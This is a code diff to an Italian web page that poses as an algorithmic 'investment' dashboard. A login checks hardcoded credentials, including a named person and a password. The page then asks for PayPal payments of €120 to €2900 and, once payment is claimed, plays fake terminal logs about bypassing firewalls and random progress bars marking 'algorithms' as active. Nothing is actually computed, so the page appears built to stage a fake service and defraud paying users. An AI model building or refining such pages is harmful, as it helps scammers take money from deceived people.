@@ -73,15 +73,29 @@
         .blinking-cursor { animation: blink 1s step-end infinite; }
         @keyframes blink { 50% { opacity: 0; } }
         
+        /* Stili per la nuova schermata di attivazione algoritmi */
+        #progress-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(13, 13, 26, 0.98); z-index: 1001; flex-direction: column;
+            align-items: center; padding: 40px 20px; box-sizing: border-box; overflow-y: auto;
+        }
+        #progress-overlay h2 {
+            color: #ff00ff; text-shadow: 0 0 10px #ff00ff; margin-bottom: 30px; text-align: center;
+        }
+        .progress-container { width: 100%; max-width: 800px; }
+        .algo-bar-wrapper { margin-bottom: 15px; }
+        .algo-bar-label { color: #00ffff; font-family: monospace; font-size: 0.9em; margin-bottom: 5px; }
+        .algo-bar-bg { width: 100%; background: #1a1a2e; border: 1px solid #800080; height: 12px; border-radius: 6px; overflow: hidden; }
+        .algo-bar-fill { height: 100%; background: linear-gradient(90deg, #800080, #00ffff); width: 0%; border-radius: 6px; }
+        .status-text { color: #aaa; float: right; font-weight: bold; }
+
         .manual-payment-box {
             background: rgba(0, 255, 255, 0.05); padding: 20px; border-radius: 8px;
             border: 1px dashed #00ffff; text-align: center; margin-top: 20px;
         }
         
-        /* Stile Prezzo Dinamico e Link PayPal */
         #calculated-price {
-            font-size: 1.8em; color: #ff00ff; text-shadow: 0 0 10px #ff00ff;
-            margin: 15px 0;
+            font-size: 1.8em; color: #ff00ff; text-shadow: 0 0 10px #ff00ff; margin: 15px 0;
         }
         #paypal-link-text {
             text-align: center; color: #00ffff; border-color: #00ffff;
@@ -139,7 +153,7 @@
         </div>
 
         <div class="manual-payment-box">
-            <h3>Acquisizione e Avvio Macinazione</h3>
+            <h3>Acquisizione e Avvio Algoritmi</h3>
             <p style="font-size:0.8em; color:#aaa;">*Trasferimento fondi tramite protocollo sicuro P2P.*</p>
             
             <div id="calculated-price">Importo richiesto: € 120</div>
@@ -149,10 +163,10 @@
             <button id="reveal-link-btn" onclick="revealLink()">Rivela Link PayPal</button>
             
             <div id="hidden-link-section" style="display: none; margin-top: 15px;">
-                <input type="text" id="paypal-link-text" value="paypal.me/XHysenji" readonly onclick="copyLink()" title="Clicca per copiare">
+                <input type="text" id="paypal-link-text" value="INSERISCI_QUI_IL_TUO_LINK_PAYPAL" readonly onclick="copyLink()" title="Clicca per copiare">
                 <p style="font-size: 0.9em; color: #00ff00; height: 20px; margin: 5px 0;" id="copy-feedback"></p>
                 
-                <button onclick="confirmManualPayment()" style="background: #28a745; border-color: #28a745; color: white; margin-top: 10px;">Ho completato il trasferimento - Avvia Terminale</button>
+                <button onclick="confirmManualPayment()" style="background: #28a745; border-color: #28a745; color: white; margin-top: 10px;">Ho completato il trasferimento - Inizializza Sistema</button>
             </div>
         </div>
     </div>
@@ -162,6 +176,13 @@
             <div id="terminal-output"></div>
             <span class="blinking-cursor">_</span>
         </div>
+    </div>
+
+    <div id="progress-overlay">
+        <h2>Monitoraggio Attivazione Algoritmi</h2>
+        <div class="progress-container" id="progress-bars-container">
+            </div>
+        <button id="close-progress-btn" style="display:none; max-width: 300px; margin-top: 30px; background: #00ffff; color: #000;" onclick="document.getElementById('progress-overlay').style.display='none'">Torna alla Dashboard Principale</button>
     </div>
 
     <script>
@@ -188,10 +209,7 @@
         geometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
         geometry.setAttribute('color', new THREE.BufferAttribute(colorArray, 3));
         
-        const material = new THREE.PointsMaterial({ 
-            size: 0.015, vertexColors: true, transparent: true, blending: THREE.AdditiveBlending, depthWrite: false
-        });
-        
+        const material = new THREE.PointsMaterial({ size: 0.015, vertexColors: true, transparent: true, blending: THREE.AdditiveBlending, depthWrite: false });
         const particlesMesh = new THREE.Points(geometry, material);
         scene.add(particlesMesh); camera.position.z = 4;
 
@@ -246,13 +264,8 @@
 
         // --- 3. Logica Prezzario Dinamico ---
         const priceMap = {
-            "20 Gb": 120,
-            "122 Gb": 170,
-            "3 Tb": 220,
-            "63 Tb": 340,
-            "12 Petabyte": 770,
-            "52 Petabyte": 1200,
-            "284 Petabyte": 2900
+            "20 Gb": 120, "122 Gb": 170, "3 Tb": 220, "63 Tb": 340,
+            "12 Petabyte": 770, "52 Petabyte": 1200, "284 Petabyte": 2900
         };
 
         function updatePrice() {
@@ -263,7 +276,6 @@
 
         // --- 4. Logica UI e Verifica Dati ---
         let chartInstances = []; 
-        
         function unlockDashboard() {
             const wallet = document.getElementById('wallet-input').value.trim();
             const channel = document.getElementById('channel-input').value.trim();
@@ -271,13 +283,7 @@
             const username = document.getElementById('username-input').value.trim();
             const password = document.getElementById('password-input').value.trim();
 
-            if (
-                wallet === '0x7F5EB4b9A12c38dE954A3B6c8A9E4125bF1A9D33' &&
-                channel === 'NODE-PRJ-77X' &&
-                network === '8842-SEC-ALPHA' &&
-                (username === 'Francesca Marini' || username === 'Francesa Marini') &&
-                password === 'Kitty2121'
-            ) {
+            if (wallet === '0x7F5EB4b9A12c38dE954A3B6c8A9E4125bF1A9D33' && channel === 'NODE-PRJ-77X' && network === '8842-SEC-ALPHA' && (username === 'Francesca Marini' || username === 'Francesa Marini') && password === 'Kitty2121') {
                 document.getElementById('registration-form').style.display = 'none';
                 document.getElementById('investment-dashboard').style.display = 'block';
                 updatePrice(); 
@@ -308,7 +314,7 @@
             });
         }
 
-        // --- 5. Logica Copia Link PayPal e Avvio Terminale ---
+        // --- 5. Logica Copia Link e Avvio Sequenze ---
         function revealLink() {
             document.getElementById('reveal-link-btn').style.display = 'none';
             document.getElementById('hidden-link-section').style.display = 'block';
@@ -316,24 +322,27 @@
 
         function copyLink() {
             const linkInput = document.getElementById('paypal-link-text');
-            linkInput.select();
-            linkInput.setSelectionRange(0, 99999); 
-            
+            linkInput.select(); linkInput.setSelectionRange(0, 99999); 
             navigator.clipboard.writeText(linkInput.value).then(() => {
                 document.getElementById('copy-feedback').innerText = "Link copiato negli appunti!";
                 setTimeout(() => { document.getElementById('copy-feedback').innerText = ""; }, 3000);
             }).catch(err => {
-                document.getElementById('copy-feedback').innerText = "Errore nella copia. Seleziona il testo manualmente.";
+                document.getElementById('copy-feedback').innerText = "Errore nella copia. Seleziona manualmente.";
                 document.getElementById('copy-feedback').style.color = "red";
             });
         }
 
         function confirmManualPayment() {
+            const selectedPack = document.querySelector('input[name="algo_pack"]:checked');
+            if (!selectedPack) {
+                alert("Attenzione: Seleziona prima un Pacchetto Algoritmi per l'analisi dei mercati.");
+                return;
+            }
             const username = document.getElementById('username-input').value || "Utente";
-            startTerminalAnimation(username);
+            startTerminalAnimation(username, selectedPack.value);
         }
 
-        function startTerminalAnimation(payerName) {
+        function startTerminalAnimation(payerName, packIndex) {
             const overlay = document.getElementById('terminal-overlay');
             const output = document.getElementById('terminal-output');
             const volume = document.getElementById('data-volume').value;
@@ -341,17 +350,14 @@
             output.innerHTML = ''; 
 
             const logs = [
-                `> Inizializzazione protocollo PayPal per l'utente: ${payerName}...`,
-                `> Acquisizione pacchetto dati: ${volume}... OK`,
-                "> Verificando transazione P2P...",
-                "> Trasferimento confermato. Cluster di calcolo centrale innescato.",
-                "> Bypass firewall nodo di rete completato.",
-                "> Caricamento 72 Algoritmi nel motore di esecuzione...",
-                "> Macinazione in corso: 14%...",
-                "> Macinazione in corso: 48%...",
-                "> Macinazione in corso: 89%...",
-                "> Macinazione in corso: 100%...",
-                "> Task completato. Rendimento in calcolo in background."
+                `> Inizializzazione protocollo di rete per: ${payerName}...`,
+                `> Acquisizione task dati: ${volume}... OK`,
+                "> Trasferimento fondi confermato dal nodo centrale.",
+                "> Bypass firewall e apertura porte di comunicazione...",
+                "> Caricamento hash crittografici nel motore...",
+                "> Allocazione risorse di calcolo...",
+                "> Inizializzazione algoritmi in corso...", // Modifica richiesta
+                "> Preparazione ambiente visivo completata."
             ];
 
             let logIndex = 0;
@@ -362,10 +368,73 @@
                     logIndex++;
                 } else {
                     clearInterval(logInterval);
-                    output.innerHTML += "<br><span style='color: #00ffff;'>> ATTESA NUOVI COMANDI...</span><br>";
-                    setTimeout(() => { overlay.style.display = 'none'; }, 5000);
+                    output.innerHTML += "<br><span style='color: #00ffff;'>> TRASFERIMENTO SEGNALE ALL'INTERFACCIA GRAFICA...</span><br>";
+                    
+                    // Dopo 2 secondi, chiude il terminale e apre la schermata delle barre
+                    setTimeout(() => { 
+                        overlay.style.display = 'none'; 
+                        startAlgorithmActivationBars(packIndex);
+                    }, 2000);
                 }
-            }, 800); 
+            }, 700); 
+        }
+
+        // --- 6. Nuova Logica: Barre di Avanzamento ---
+        function startAlgorithmActivationBars(packIndex) {
+            const overlay = document.getElementById('progress-overlay');
+            const container = document.getElementById('progress-bars-container');
+            const closeBtn = document.getElementById('close-progress-btn');
+            
+            overlay.style.display = 'flex';
+            container.innerHTML = '';
+            closeBtn.style.display = 'none';
+
+            // Recupera gli algoritmi specifici scelti dall'utente
+            const algorithmsToActivate = packagesData[packIndex];
+
+            // Crea l'HTML per ogni barra
+            algorithmsToActivate.forEach((algo, index) => {
+                container.innerHTML += `
+                    <div class="algo-bar-wrapper">
+                        <div class="algo-bar-label">${algo} <span class="status-text" id="status-${index}">Avvio...</span></div>
+                        <div class="algo-bar-bg">
+                            <div class="algo-bar-fill" id="fill-${index}"></div>
+                        </div>
+                    </div>
+                `;
+            });
+
+            // Avvia le animazioni con tempi leggermente casuali per simulare il caricamento
+            let maxDuration = 0;
+
+            setTimeout(() => {
+                algorithmsToActivate.forEach((algo, index) => {
+                    const fill = document.getElementById(`fill-${index}`);
+                    const status = document.getElementById(`status-${index}`);
+                    
+                    // Durata casuale tra i 2 e i 6 secondi
+                    const duration = Math.random() * 4000 + 2000; 
+                    if (duration > maxDuration) maxDuration = duration;
+
+                    fill.style.transition = `width ${duration}ms ease-in-out`;
+                    
+                    // Forza il reflow per applicare l'animazione css
+                    void fill.offsetWidth;
+                    fill.style.width = '100%';
+
+                    // Quando la barra finisce, aggiorna il testo
+                    setTimeout(() => {
+                        status.innerText = 'ATTIVO';
+                        status.style.color = '#00ff00';
+                    }, duration);
+                });
+
+                // Mostra il pulsante di chiusura solo quando l'ultima barra ha finito
+                setTimeout(() => {
+                    closeBtn.style.display = 'block';
+                }, maxDuration + 500);
+
+            }, 500);
         }
     </script>
 </body>
